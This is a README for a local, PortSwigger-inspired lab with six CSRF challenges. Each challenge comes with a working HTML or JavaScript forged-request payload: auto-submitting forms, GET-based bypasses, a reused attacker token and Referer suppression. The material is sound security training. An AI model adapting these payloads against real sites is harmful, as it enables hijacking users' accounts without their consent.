# PortSwigger Inspired CSRF Labs

Local lab environment with 6 CSRF challenges, from basic exploitation to multi-layer defense bypasses.

## Quick Start

```bash
npm install      # first time only
npm start        # starts server on port 3000
```

Open [http://localhost:3000](http://localhost:3000)

---

## Lab 1: CSRF with No Defenses (Apprentice)

**Vulnerability:** The email change endpoint accepts any POST with no token, no SameSite restriction, no Referer check.

**Goal:** Change the victim's email to `attacker@evil.com`.

**Solve:**
1. Go to the Exploit Server (`/exploit-editor`)
2. Use the **Lab 1 — Basic POST** template or paste:
   ```html
   <form action="http://localhost:3000/email/change/1" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com">
   </form>
   <script>document.forms[0].submit();</script>
   ```
3. Click **Store** → **Deliver exploit to victim**
4. Check the Request Inspector on the lab page — email changed.

---

## Lab 2: Token Validated on POST Only (Practitioner)

**Vulnerability:** CSRF token is checked for `POST` but the endpoint also accepts `GET` with no token check.

**Goal:** Bypass token validation by switching to a GET request.

**Solve:**
1. Use the **Lab 2 — GET bypass** template:
   ```html
   <script>
     document.location = 'http://localhost:3000/email/change/2?email=attacker@evil.com';
   </script>
   ```
2. Store and deliver. The GET request carries no token and the server accepts it.

---

## Lab 3: Token Validated Only When Present (Practitioner)

**Vulnerability:** Server validates the token only `if (req.body.csrf)` — if the field is absent entirely, the check is skipped.

**Goal:** Send a POST with no `csrf` field at all.

**Solve:**
1. Use the **Lab 3 — Token absent** template:
   ```html
   <form action="http://localhost:3000/email/change/3" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com">
     <!-- No csrf field -->
   </form>
   <script>document.forms[0].submit();</script>
   ```
2. Store and deliver. Server skips validation because the param is absent.

---

## Lab 4: Token Not Tied to User Session (Practitioner)

**Vulnerability:** Tokens are validated against a global pool — any valid token works for any user's session.

**Goal:** Use the attacker's own valid token (`csrf_token_abc123xyz`) in a forged request targeting the victim.

**Solve:**
1. Use the **Lab 4 — Attacker token** template:
   ```html
   <form action="http://localhost:3000/email/change/4" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com">
     <input type="hidden" name="csrf" value="csrf_token_abc123xyz">
   </form>
   <script>document.forms[0].submit();</script>
   ```
2. Store and deliver. The server accepts the attacker's token as valid for the victim's request.

---

## Lab 5: SameSite Lax Bypass via GET (Practitioner)

**Vulnerability:** Cookie has `SameSite=Lax` (blocks cross-site POST) but the endpoint also accepts GET requests for email changes. Lax cookies are sent with cross-site top-level GET navigations.

**Goal:** Trigger the email change via a GET-based navigation.

**Solve:**
1. Use the **Lab 5 — SameSite Lax** template:
   ```html
   <script>
     document.location = 'http://localhost:3000/email/change/5?email=attacker@evil.com';
   </script>
   ```
2. Store and deliver. The top-level navigation sends the Lax cookie and the email changes.

---

## Lab 6: Referer Validation Bypass (Practitioner)

**Vulnerability:** The server validates the `Referer` header but only when it is present. Suppressing the header (via `<meta name="referrer" content="never">`) bypasses the check entirely.

**Goal:** Drop the Referer header from the forged request.

**Solve:**
1. Use the **Lab 6 — Referer bypass** template:
   ```html
   <html>
     <head><meta name="referrer" content="never"></head>
     <body>
       <form action="http://localhost:3000/email/change/6" method="POST">
         <input type="hidden" name="email" value="attacker@evil.com">
       </form>
       <script>document.forms[0].submit();</script>
     </body>
   </html>
   ```
2. Store and deliver. The server receives the POST with no Referer and skips validation.

---

## Troubleshooting

- Use port **3000** (`http://localhost:3000`)
- Run `npm install` if you see `Cannot find module 'express'`
- The Request Inspector on each lab page shows exactly what the server received
- Click **Reset Lab State** on any lab page to reset the email back to the default
